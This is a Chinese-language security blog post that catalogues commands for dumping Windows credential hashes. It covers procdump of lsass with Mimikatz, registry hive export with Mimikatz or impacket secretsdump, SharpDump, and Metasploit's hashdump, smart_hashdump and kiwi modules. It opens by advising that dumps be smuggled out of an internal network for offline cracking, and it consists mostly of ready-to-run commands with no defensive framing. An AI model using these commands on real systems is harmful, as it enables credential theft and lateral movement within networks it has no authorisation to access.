<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 常用 Windows 抓取Hash · Patrilic's blog</title><meta name="description" content="常用 Windows 抓取Hash - Patrilic"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/Avatar.jpg"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://patrilic.top/atom.xml" title="Patrilic's blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/Online_Tools" target="_self" class="nav-list-link">ONLINE_TOOLS</a></li><li class="nav-list-item"><a href="/Friends" target="_self" class="nav-list-link">FRIENDS</a></li><li class="nav-list-item"><a href="/2019/04/01/Hello/" target="_self" class="nav-list-link">ABOUT</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">常用 Windows 抓取Hash</h1><div class="post-info">May 1, 2019</div><div class="post-content"><p><strong>推荐使用 Procdump，reg 和 sharpdump 导出本地，再想办法从内网中运出来本地破解</strong></p>
<h2 id="0x01-Procdump-Mimikatz"><a href="#0x01-Procdump-Mimikatz" class="headerlink" title="0x01 Procdump + Mimikatz"></a>0x01 Procdump + Mimikatz</h2><p>Procdump<br>(管理员权限下运行)<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">temp</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span> //<span class="title">For</span> 32 <span class="title">bits</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">temp</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -64 -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span> //<span class="title">For</span> 64 <span class="title">bits</span></span></span><br></pre></td></tr></table></figure></p>
<p><img src="/Windows 抓取Hash.resources/5FE37FF2-25D9-45B1-851E-874383718EE9.png" alt="ac82bb7eeb7a22a8374cf6d938f39723"></p>
<p>然后本地解出hash即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump C:\lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure></p>
<p><img src="/Windows 抓取Hash.resources/BE8A461A-1A00-4764-BB1D-8C96C38779A4.png" alt="8217226578225fab9a1492a3aeca235d"></p>
<h2 id="0x02-Reg-impacket-Mimikatz-强推"><a href="#0x02-Reg-impacket-Mimikatz-强推" class="headerlink" title="0x02 Reg + impacket/Mimikatz (强推)"></a>0x02 Reg + impacket/Mimikatz (强推)</h2><p>使用<strong>Reg</strong>需要NT/SYSTEM权限<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line"></span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line"></span><br><span class="line">reg save HKLM\security security.hiv</span><br></pre></td></tr></table></figure></p>
<h3 id="Mimikatz-调用-lsadump"><a href="#Mimikatz-调用-lsadump" class="headerlink" title="Mimikatz 调用 lsadump"></a>Mimikatz 调用 lsadump</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /system:system.hiv /sam:sam.hiv</span><br></pre></td></tr></table></figure>
<p><img src="/Windows 抓取Hash.resources/6FE3B05C-F2BD-4C78-B26D-E4BF0476BECE.png" alt="db38857f0f6c6dc2c9f9035664e6993d"></p>
<h3 id="impacket-secretsdump-py"><a href="#impacket-secretsdump-py" class="headerlink" title="impacket/secretsdump.py"></a>impacket/secretsdump.py</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure>
<p><img src="/Windows 抓取Hash.resources/E7E2A416-FD55-4F50-A437-876466B61879.png" alt="242aff6a39bba29a99ef4947d7a99cc2"></p>
<h2 id="0x03-Sharpdump-强推"><a href="#0x03-Sharpdump-强推" class="headerlink" title="0x03 Sharpdump  (强推)"></a>0x03 Sharpdump  (强推)</h2><p>Out-Minidump.ps1 的 C#版本 编译结果<br>需要.NET 3.5版本框架<br><img src="/Windows 抓取Hash.resources/0895B794-5AA9-485E-85A2-F8130EAD8EC5.png" alt="45e9926e499fde1ffa70410d600137ee"></p>
<h2 id="0x04-Wce、Quarks-PwDump、GetPass……"><a href="#0x04-Wce、Quarks-PwDump、GetPass……" class="headerlink" title="0x04 Wce、Quarks PwDump、GetPass……"></a>0x04 Wce、Quarks PwDump、GetPass……</h2><p>没怎么用过，都是以前比较老的，Getpass是Mimikatz的编译版本，没啥意思</p>
<h2 id="0x05-Msf-modules"><a href="#0x05-Msf-modules" class="headerlink" title="0x05 Msf modules"></a>0x05 Msf modules</h2><h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><p>条件:</p>
<ol>
<li>Meterpreter Session</li>
<li>NT/SYSTEM</li>
</ol>
<p><img src="/Windows 抓取Hash.resources/2EB1A5C5-7939-4533-B30F-88DDD7CDB06F.png" alt="07030d8ceedbedabf174df555d21d903"></p>
<p>hashdump只能dump本地用户</p>
<h3 id="smart-hashdump"><a href="#smart-hashdump" class="headerlink" title="smart_hashdump"></a>smart_hashdump</h3><p>条件</p>
<ol>
<li>Meterpreter Session</li>
<li>NT/SYSTEM</li>
</ol>
<p><img src="/Windows 抓取Hash.resources/8985233C-E94F-49FE-9D8E-C6904AC4DD44.png" alt="ba9d49921ba6634abcc41e4ee0dfc0d1"></p>
<p>可以dump本地 + 域用户hash</p>
<h3 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h3><p>条件</p>
<ol>
<li>Meterpreter Session</li>
<li>NT/SYSTEM</li>
</ol>
<p><img src="/Windows 抓取Hash.resources/83900C86-A8C7-4190-B99A-AA696699C1B5.png" alt="0bb8fe85b3463c08b98173e8493190df"></p>
</div></article></div></main><footer><div class="paginator"><a href="/2019/04/23/第十二届全国大学生信息安全竞赛初赛Write up/" class="next">NEXT</a></div><div class="copyright"><p>© 2019 <a href="http://patrilic.top">Patrilic</a>, powered by Apoll.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>